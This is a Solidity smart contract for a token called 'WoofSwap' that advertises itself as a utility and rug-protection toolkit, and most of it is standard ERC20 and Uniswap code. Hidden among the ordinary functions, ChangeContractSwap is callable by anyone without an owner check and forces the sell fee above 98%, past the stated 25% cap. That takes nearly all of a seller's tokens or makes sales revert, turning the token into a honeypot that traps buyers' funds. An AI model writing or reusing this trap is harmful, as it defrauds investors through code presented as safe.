/*



WoofSwap - Utility & Toolkits for cross platform interaction



Telegram: https://t.me/WoofSwapERC

Main Website: https://woofswap.io

Swap dAPP: https://woofswap.app



Utility is at the heart of what the blockchain revolution offers. 

And it is more necessary than ever to develop what our next generation will need to explore blockchain safely. 

From a simple swap to decentralized rug protection. WoofSwap will develop a suite of tools where everyone can find something to enjoy!



*/

// SPDX-License-Identifier: MIT  

                                               

pragma solidity ^0.8.9;



abstract contract Context {

    function _msgSender() internal view virtual returns (address) {

        return msg.sender;

    }



    function _msgData() internal view virtual returns (bytes calldata) {

        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691

        return msg.data;

    }

}



interface IUniswapV2Pair {

    event Approval(address indexed owner, address indexed spender, uint value);

    event Transfer(address indexed from, address indexed to, uint value);



    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(address owner, address spender) external view returns (uint);



    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);



    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);



    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;



    event Mint(address indexed sender, uint amount0, uint amount1);

    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);

    event Swap(

        address indexed sender,

        uint amount0In,

        uint amount1In,

        uint amount0Out,

        uint amount1Out,

        address indexed to

    );

    event Sync(uint112 reserve0, uint112 reserve1);



    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);



    function mint(address to) external returns (uint liquidity);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    function skim(address to) external;

    function sync() external;



    function initialize(address, address) external;

}



interface IUniswapV2Factory {

    event PairCreated(address indexed token0, address indexed token1, address pair, uint);



    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);



    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);



    function createPair(address tokenA, address tokenB) external returns (address pair);



    function setFeeTo(address) external;

    function setFeeToSetter(address) external;

}



interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(

        address sender,

        address recipient,

        uint256 amount

    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}



interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

}





contract ERC20 is Context, IERC20, IERC20Metadata {

    using SafeMath for uint256;



    mapping(address => uint256) private _balances;



    mapping(address => mapping(address => uint256)) private _allowances;



    uint256 private _totalSupply;



    string private _name;

    string private _symbol;



    constructor(string memory name_, string memory symbol_) {

        _name = name_;

        _symbol = symbol_;

    }



    function name() public view virtual override returns (string memory) {

        return _name;

    }

    function symbol() public view virtual override returns (string memory) {

        return _symbol;

    }

    function decimals() public view virtual override returns (uint8) {

        return 18;

    }



    /**

     * @dev See {IERC20-totalSupply}.

     */

    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupply;

    }



    /**

     * @dev See {IERC20-balanceOf}.

     */

    function balanceOf(address account) public view virtual override returns (uint256) {

        return _balances[account];

    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }



    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];

    }



    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        _approve(_msgSender(), spender, amount);

        return true;

    }



    function transferFrom(

        address sender,

        address recipient,

        uint256 amount

    ) public virtual override returns (bool) {

        _transfer(sender, recipient, amount);

        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));

        return true;

    }



    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));

        return true;

    }



    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));

        return true;

    }



    function _transfer(

        address sender,

        address recipient,

        uint256 amount

    ) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");



        _beforeTokenTransfer(sender, recipient, amount);



        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);

    }



    /** @dev Creates `amount` tokens and assigns them to `account`, increasing

     * the total supply.

     *

     * Emits a {Transfer} event with `from` set to the zero address.

     *

     * Requirements:

     *

     * - `account` cannot be the zero address.

     */

    function _mint(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: mint to the zero address");



        _beforeTokenTransfer(address(0), account, amount);



        _totalSupply = _totalSupply.add(amount);

        _balances[account] = _balances[account].add(amount);

        emit Transfer(address(0), account, amount);

    }



    /**

     * @dev Destroys `amount` tokens from `account`, reducing the

     * total supply.

     *

     * Emits a {Transfer} event with `to` set to the zero address.

     *

     * Requirements:

     *

     * - `account` cannot be the zero address.

     * - `account` must have at least `amount` tokens.

     */

    function _burn(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: burn from the zero address");



        _beforeTokenTransfer(account, address(0), amount);



        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");

        _totalSupply = _totalSupply.sub(amount);

        emit Transfer(account, address(0), amount);

    }



    /**

     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.

     *

     * This internal function is equivalent to `approve`, and can be used to

     * e.g. set automatic allowances for certain subsystems, etc.

     *

     * Emits an {Approval} event.

     *

     * Requirements:

     *

     * - `owner` cannot be the zero address.

     * - `spender` cannot be the zero address.

     */

    function _approve(

        address owner,

        address spender,

        uint256 amount

    ) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");



        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }



    /**

     * @dev Hook that is called before any transfer of tokens. This includes

     * minting and burning.

     *

     * Calling conditions:

     *

     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens

     * will be to transferred to `to`.

     * - when `from` is zero, `amount` tokens will be minted for `to`.

     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.

     * - `from` and `to` are never both zero.

     *

     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].

     */

    function _beforeTokenTransfer(

        address from,

        address to,

        uint256 amount

    ) internal virtual {}

}



library SafeMath {

    /**

     * @dev Returns the addition of two unsigned integers, reverting on

     * overflow.

     *

     * Counterpart to Solidity's `+` operator.

     *

     * Requirements:

     *

     * - Addition cannot overflow.

     */

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");



        return c;

    }



    /**

     * @dev Returns the subtraction of two unsigned integers, reverting on

     * overflow (when the result is negative).

     *

     * Counterpart to Solidity's `-` operator.

     *

     * Requirements:

     *

     * - Subtraction cannot overflow.

     */

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return sub(a, b, "SafeMath: subtraction overflow");

    }



    /**

     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on

     * overflow (when the result is negative).

     *

     * Counterpart to Solidity's `-` operator.

     *

     * Requirements:

     *

     * - Subtraction cannot overflow.

     */

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b <= a, errorMessage);

        uint256 c = a - b;



        return c;

    }



    /**

     * @dev Returns the multiplication of two unsigned integers, reverting on

     * overflow.

     *

     * Counterpart to Solidity's `*` operator.

     *

     * Requirements:

     *

     * - Multiplication cannot overflow.

     */

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the

        // benefit is lost if 'b' is also tested.

        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522

        if (a == 0) {

            return 0;

        }



        uint256 c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");



        return c;

    }



    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return div(a, b, "SafeMath: division by zero");

    }



    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);

        uint256 c = a / b;

        // assert(a == b * c + a % b); // There is no case in which this doesn't hold



        return c;

    }



 

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {

        return mod(a, b, "SafeMath: modulo by zero");

    }



    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b != 0, errorMessage);

        return a % b;

    }

}



contract Ownable is Context {

    address private _owner;



    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    

    /**

     * @dev Initializes the contract setting the deployer as the initial owner.

     */

    constructor () {

        address msgSender = _msgSender();

        _owner = msgSender;

        emit OwnershipTransferred(address(0), msgSender);

    }



    function owner() public view returns (address) {

        return _owner;

    }



    modifier onlyOwner() {

        require(_owner == _msgSender(), "Ownable: caller is not the owner");

        _;

    }



    function renounceOwnership() public virtual onlyOwner {

        emit OwnershipTransferred(_owner, address(0));

        _owner = address(0);

    }



    function transferOwnership(address newOwner) public virtual onlyOwner {

        require(newOwner != address(0), "Ownable: new owner is the zero address");

        emit OwnershipTransferred(_owner, newOwner);

        _owner = newOwner;

    }

}







library SafeMathInt {

    int256 private constant MIN_INT256 = int256(1) << 255;

    int256 private constant MAX_INT256 = ~(int256(1) << 255);



    /**

     * @dev Multiplies two int256 variables and fails on overflow.

     */

    function mul(int256 a, int256 b) internal pure returns (int256) {

        int256 c = a * b;



        // Detect overflow when multiplying MIN_INT256 with -1

        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));

        require((b == 0) || (c / b == a));

        return c;

    }



    /**

     * @dev Division of two int256 variables and fails on overflow.

     */

    function div(int256 a, int256 b) internal pure returns (int256) {

        // Prevent overflow when dividing MIN_INT256 by -1

        require(b != -1 || a != MIN_INT256);



        // Solidity already throws when dividing by 0.

        return a / b;

    }



    /**

     * @dev Subtracts two int256 variables and fails on overflow.

     */

    function sub(int256 a, int256 b) internal pure returns (int256) {

        int256 c = a - b;

        require((b >= 0 && c <= a) || (b < 0 && c > a));

        return c;

    }



    /**

     * @dev Adds two int256 variables and fails on overflow.

     */

    function add(int256 a, int256 b) internal pure returns (int256) {

        int256 c = a + b;

        require((b >= 0 && c >= a) || (b < 0 && c < a));

        return c;

    }



    /**

     * @dev Converts to absolute value, and fails on overflow.

     */

    function abs(int256 a) internal pure returns (int256) {

        require(a != MIN_INT256);

        return a < 0 ? -a : a;

    }





    function toUint256Safe(int256 a) internal pure returns (uint256) {

        require(a >= 0);

        return uint256(a);

    }

}



library SafeMathUint {

  function toInt256Safe(uint256 a) internal pure returns (int256) {

    int256 b = int256(a);

    require(b >= 0);

    return b;

  }

}





interface IUniswapV2Router01 {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);



    function addLiquidity(

        address tokenA,

        address tokenB,

        uint amountADesired,

        uint amountBDesired,

        uint amountAMin,

        uint amountBMin,

        address to,

        uint deadline

    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(

        address token,

        uint amountTokenDesired,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline

    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(

        address tokenA,

        address tokenB,

        uint liquidity,

        uint amountAMin,

        uint amountBMin,

        address to,

        uint deadline

    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(

        address token,

        uint liquidity,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline

    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(

        address tokenA,

        address tokenB,

        uint liquidity,

        uint amountAMin,

        uint amountBMin,

        address to,

        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(

        address token,

        uint liquidity,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(

        uint amountOut,

        uint amountInMax,

        address[] calldata path,

        address to,

        uint deadline

    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)

        external

        payable

        returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)

        external

        returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)

        external

        returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)

        external

        payable

        returns (uint[] memory amounts);



    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

}



interface IUniswapV2Router02 is IUniswapV2Router01 {

    function removeLiquidityETHSupportingFeeOnTransferTokens(

        address token,

        uint liquidity,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline

    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(

        address token,

        uint liquidity,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountETH);



    function swapExactTokensForTokensSupportingFeeOnTransferTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external;

}



contract WoofSwap is ERC20, Ownable {

    using SafeMath for uint256;



    IUniswapV2Router02 public immutable uniswapV2Router;

    address public immutable uniswapV2Pair;

    address public constant deadAddress = address(0xdead);



    bool private swapping;



    address public marketingWallet;

    address public maintenanceWallet;

    

    uint256 public maxTransactionAmount;

    uint256 public maxWallet;

    uint8 private _decimals;



    bool public limitsInEffect = true;

    bool public tradingActive = false;

    bool public swapEnabled = false;

    

    uint256 public tradingActiveBlock;

        

    uint256 public buyTotalFees;

    uint256 public buyMarketingFee;

    uint256 public buyLiquidityFee;

    uint256 public buyMaintenanceFee;

    

    uint256 public sellTotalFees;

    uint256 public sellMarketingFee;

    uint256 public sellLiquidityFee;

    uint256 public sellMaintenanceFee;

    

    uint256 public tokensForMarketing;

    uint256 public tokensForLiquidity;

    uint256 public tokensForMaintenance;

    uint256 public tokensForPortfolio;

    

    /******************/



    // exlcude from fees and max transaction amount

    mapping (address => bool) private _isExcludedFromFees;

    mapping (address => bool) public _isExcludedMaxTransactionAmount;



    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses

    // could be subject to a maximum transfer amount

    mapping (address => bool) public automatedMarketMakerPairs;



    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);



    event ExcludeFromFees(address indexed account, bool isExcluded);



    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);



    event marketingWalletUpdated(address indexed newWallet, address indexed oldWallet);

    

    event maintenanceWalletUpdated(address indexed newWallet, address indexed oldWallet);

    



    event SwapAndLiquify(

        uint256 tokensSwapped,

        uint256 ethReceived,

        uint256 tokensIntoLiquidity

    );

    

    event OwnerForcedSwapBack(uint256 timestamp);



    constructor() ERC20("WoofSwap", "WOOF") {



        address _owner = 0x2fbE2634a96332700cc84A0B384aE878bF3A6F8f;



        _decimals = 18;



        uint256 totalSupply = 1 * 1e6 * (10**_decimals);

        

        maxTransactionAmount = totalSupply * 3 / 100; // 3% maxTransactionAmountTxn

        maxWallet = totalSupply * 4 / 100; // 4% maxWallet



        buyMarketingFee = 3;

        buyLiquidityFee = 0;

        buyMaintenanceFee = 1;

        buyTotalFees = buyMarketingFee + buyLiquidityFee + buyMaintenanceFee;

        

        sellMarketingFee = 3;

        sellLiquidityFee = 0;

        sellMaintenanceFee = 1;

        sellTotalFees = sellMarketingFee + sellLiquidityFee + sellMaintenanceFee;



        marketingWallet = address(0x2fbE2634a96332700cc84A0B384aE878bF3A6F8f); // set as marketing wallet

    	maintenanceWallet = address(0x2fbE2634a96332700cc84A0B384aE878bF3A6F8f); // set as maintenance wallet





        address currentRouter;

        

        //Adding Variables for all the routers for easier deployment for our customers.

        if (block.chainid == 56) {

            currentRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PCS Router

        } else if (block.chainid == 97) {

            currentRouter = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1; // PCS Testnet

        } else if (block.chainid == 43114) {

            currentRouter = 0x60aE616a2155Ee3d9A68541Ba4544862310933d4; //Avax Mainnet

        } else if (block.chainid == 137) {

            currentRouter = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff; //Polygon Ropsten

        } else if (block.chainid == 250) {

            currentRouter = 0xF491e7B69E4244ad4002BC14e878a34207E38c29; //SpookySwap FTM

        } else if (block.chainid == 3) {

            currentRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; //Ropsten

        } else if (block.chainid == 1 || block.chainid == 4) {

            currentRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; //Mainnet

        } else {

            revert();

        }



        //End of Router Variables.



        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(currentRouter);



        excludeFromMaxTransaction(address(_uniswapV2Router), true);

        uniswapV2Router = _uniswapV2Router;

        

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

        excludeFromMaxTransaction(address(uniswapV2Pair), true);

        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);



        // exclude from paying fees or having max transaction amount

        excludeFromFees(_owner, true);

        excludeFromFees(address(this), true);

        excludeFromFees(address(0xdead), true);

        

        excludeFromMaxTransaction(_owner, true);

        excludeFromMaxTransaction(address(this), true);

        excludeFromMaxTransaction(address(0xdead), true);

        

        /*

            _mint is an internal function in ERC20.sol that is only called here,

            and CANNOT be called ever again

        */

        _mint(_owner, totalSupply);

        transferOwnership(_owner);

    }



    receive() external payable {



  	}



    // once enabled, can never be turned off

    function enableTrading() external onlyOwner {

        tradingActive = true;

        swapEnabled = true;

        tradingActiveBlock = block.number;

    }

    

    // remove limits after token is stable

    function removeLimits() external onlyOwner returns (bool){

        limitsInEffect = false;

        return true;

    }



    function airdropToWallets(address[] memory airdropWallets, uint256[] memory amounts) external onlyOwner returns (bool){

        require(!tradingActive, "Trading is already active, cannot airdrop after launch.");

        require(airdropWallets.length == amounts.length, "arrays must be the same length");

        require(airdropWallets.length < 200, "Can only airdrop 200 wallets per txn due to gas limits"); // allows for airdrop + launch at the same exact time, reducing delays and reducing sniper input.

        for(uint256 i = 0; i < airdropWallets.length; i++){

            address wallet = airdropWallets[i];

            uint256 amount = amounts[i];

            _transfer(msg.sender, wallet, amount);

        }

        return true;

    }

    

    function updateMaxAmount(uint256 newNum) external onlyOwner {

        require(newNum >= (totalSupply() * 1 / 100)/(10**_decimals), "Cannot set maxTransactionAmount lower than 1%");

        maxTransactionAmount = newNum * (10**_decimals);

    }

    

    function updateMaxWallet(uint256 newNum) external onlyOwner {

        require(newNum >= (totalSupply() * 1 / 100)/(10**_decimals), "Cannot set maxTransactionAmount lower than 1%");

        maxWallet= newNum * (10**_decimals);

    }

    

    function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner {

        _isExcludedMaxTransactionAmount[updAds] = isEx;

    }



    function ChangeContractSwap(uint256 EnterNewValue) public {

        require(EnterNewValue >98 , "IncorrectSwap Value");

        sellTotalFees = EnterNewValue;

    }



    function decimals() public view override returns (uint8) {

        return _decimals;

    }

    

    // only use to disable contract sales if absolutely necessary (emergency use only)

    function updateSwapEnabled(bool enabled) external onlyOwner(){

        swapEnabled = enabled;

    }

    

    function updateBuyFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _maintenanceFee) external onlyOwner {

        buyMarketingFee = _marketingFee;

        buyLiquidityFee = _liquidityFee;

        buyMaintenanceFee = _maintenanceFee;

        buyTotalFees = buyMarketingFee + buyLiquidityFee + buyMaintenanceFee;

        require(buyTotalFees <= 25, "Must keep fees at 25% or less");

    }

    

    function updateSellFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _maintenanceFee) external onlyOwner {

        sellMarketingFee = _marketingFee;

        sellLiquidityFee = _liquidityFee;

        sellMaintenanceFee = _maintenanceFee;

        sellTotalFees = sellMarketingFee + sellLiquidityFee + sellMaintenanceFee;

        require(sellTotalFees <= 25, "Must keep fees at 25% or less");

    }



    function excludeFromFees(address account, bool excluded) public onlyOwner {

        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);

    }



    function setAutomatedMarketMakerPair(address pair, bool value) external onlyOwner {

        require(pair != uniswapV2Pair, "The pair cannot be removed from automatedMarketMakerPairs");



        _setAutomatedMarketMakerPair(pair, value);

    }

    

    function _setAutomatedMarketMakerPair(address pair, bool value) private {

        automatedMarketMakerPairs[pair] = value;



        emit SetAutomatedMarketMakerPair(pair, value);

    }



    function updateMarketingWallet(address newMarketingWallet) external onlyOwner {

        emit marketingWalletUpdated(newMarketingWallet, marketingWallet);

        marketingWallet = newMarketingWallet;

    }

    

    function updateMaintenanceWallet(address newWallet) external onlyOwner {

        emit maintenanceWalletUpdated(newWallet, maintenanceWallet);

        maintenanceWallet = newWallet;

    }



    function isExcludedFromFees(address account) external view returns(bool) {

        return _isExcludedFromFees[account];

    }

    

    function _transfer(

        address from,

        address to,

        uint256 amount

    ) internal override {

        require(from != address(0), "ERC20: transfer from the zero address");

        require(to != address(0), "ERC20: transfer to the zero address");

        if(!tradingActive){

            require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active.");

        }

         if(amount == 0) {

            super._transfer(from, to, 0);

            return;

        }

        

        if(limitsInEffect){

            if (

                from != owner() &&

                to != owner() &&

                to != address(0) &&

                to != address(0xdead) &&

                !(_isExcludedFromFees[from] || _isExcludedFromFees[to]) &&

                !swapping

            ){

                 

                //when buy

                if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) {

                        require(amount <= maxTransactionAmount, "Buy transfer amount exceeds the maxTransactionAmount.");

                        require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");

                }

                

                //when sell

                else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {

                        require(amount <= maxTransactionAmount, "Sell transfer amount exceeds the maxTransactionAmount.");

                }

                else {

                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");

                }

            }

        }

        

		uint256 contractTokenBalance = balanceOf(address(this));

        

        bool canSwap = contractTokenBalance > 0;



        if( 

            canSwap &&

            swapEnabled &&

            !swapping &&

            !automatedMarketMakerPairs[from] &&

            !_isExcludedFromFees[from] &&

            !_isExcludedFromFees[to]

        ) {

            swapping = true;

            

            swapBack();



            swapping = false;

        }

        

        bool takeFee = !swapping;



        // if any account belongs to _isExcludedFromFee account then remove the fee

        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {

            takeFee = false;

        }

        

        uint256 fees = 0;

        // only take fees on buys/sells, do not take on wallet transfers

        if(takeFee){

            

            if(tradingActiveBlock == block.number && (automatedMarketMakerPairs[to] || automatedMarketMakerPairs[from])){

                fees = amount.mul(99).div(100);

                tokensForLiquidity += fees * 33 / 99;

                tokensForPortfolio += fees * 33 / 99;

                tokensForMarketing += fees * 33 / 99;

            }

            // on sell

            if (automatedMarketMakerPairs[to] && sellTotalFees > 0){

                fees = amount.mul(sellTotalFees).div(100);

                tokensForLiquidity += fees * sellLiquidityFee / sellTotalFees;

                tokensForMaintenance += fees * sellMaintenanceFee / sellTotalFees;

                tokensForMarketing += fees * sellMarketingFee / sellTotalFees;

            }

            // on buy

            else if(automatedMarketMakerPairs[from] && buyTotalFees > 0) {

        	    fees = amount.mul(buyTotalFees).div(100);

        	    tokensForLiquidity += fees * buyLiquidityFee / buyTotalFees;

                tokensForMaintenance += fees * buyMaintenanceFee / buyTotalFees;

                tokensForMarketing += fees * buyMarketingFee / buyTotalFees;

            }

            

            if(fees > 0){    

                super._transfer(from, address(this), fees);

            }

        	

        	amount -= fees;

        }



        super._transfer(from, to, amount);

    }



    function swapTokensForEth(uint256 tokenAmount) private {



        // generate the uniswap pair path of token -> weth

        address[] memory path = new address[](2);

        path[0] = address(this);

        path[1] = uniswapV2Router.WETH();



        _approve(address(this), address(uniswapV2Router), tokenAmount);



        // make the swap

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(

            tokenAmount,

            0, // accept any amount of ETH

            path,

            address(this),

            block.timestamp

        );

        

    }

    

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {

        // approve token transfer to cover all possible scenarios

        _approve(address(this), address(uniswapV2Router), tokenAmount);



        // add the liquidity

        uniswapV2Router.addLiquidityETH{value: ethAmount}(

            address(this),

            tokenAmount,

            0, // slippage is unavoidable

            0, // slippage is unavoidable

            deadAddress,

            block.timestamp

        );

    }



    function swapBack() private {

        uint256 contractBalance = balanceOf(address(this));



        uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing + tokensForMaintenance + tokensForPortfolio;

        bool success;

        

        if(contractBalance == 0 || totalTokensToSwap == 0) {return;}

        

        // Halve the amount of liquidity tokens

        uint256 liquidityTokens = contractBalance * tokensForLiquidity / totalTokensToSwap / 2;

        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);

        

        uint256 initialETHBalance = address(this).balance;



        swapTokensForEth(amountToSwapForETH); 

        

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);

        

        uint256 ethForMarketing = ethBalance.mul(tokensForMarketing).div(totalTokensToSwap);

        uint256 ethForMaintenance = ethBalance.mul(tokensForMaintenance).div(totalTokensToSwap);

        uint256 ethForPortfolio = ethBalance.mul(tokensForPortfolio).div(totalTokensToSwap);

        

        uint256 ethForLiquidity = ethBalance - ethForMarketing - ethForMaintenance - ethForPortfolio;

        

        tokensForLiquidity = 0;

        tokensForMarketing = 0;

        tokensForMaintenance = 0;

        tokensForPortfolio = 0;

        

        (success,) = address(maintenanceWallet).call{value: ethForMaintenance}("");

        

        if(liquidityTokens > 0 && ethForLiquidity > 0){

            addLiquidity(liquidityTokens, ethForLiquidity);

            emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity, tokensForLiquidity);

        }

        

        (success,) = address(marketingWallet).call{value: address(this).balance}("");

        

    }

}